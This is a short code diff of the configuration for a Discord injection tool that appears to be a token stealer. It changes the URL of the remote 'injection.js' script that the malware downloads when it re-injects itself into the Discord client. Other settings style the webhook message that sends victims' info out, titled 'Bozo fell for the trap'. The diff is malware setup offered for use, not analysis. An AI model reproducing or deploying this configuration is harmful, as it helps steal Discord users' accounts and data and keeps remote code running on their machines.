@@ -13,7 +13,7 @@ const config = {
   embed_name: "Bozo fell for the trap", //name of the webhook thats gonna send the info
   embed_icon: "https://cdn.discordapp.com/attachments/985849153089335366/1007741605207343134/unknown.png".replace(/ /g, "%20"), //icon for the webhook thats gonna send the info (yes you can have spaces in the url)
   embed_color: 16713222, //color for the embed, needs to be hexadecimal (just copy a hex and then use https://www.binaryhexconverter.com/hex-to-decimal-converter to convert it)
-  injection_url: "https://raw.githubusercontent.com/Rdimo/Discord-Injection/master/injection.js", //injection url for when it reinjects
+  injection_url: "https://raw.githubusercontent.com/Cryxyemi/Discord-Injection/master/injection.js", //injection url for when it reinjects
   /**
    * @ATTENTION DON'T TOUCH UNDER HERE IF UNLESS YOU'RE MODIFYING THE INJECTION OR KNOW WHAT YOU'RE DOING @ATTENTION
    **/
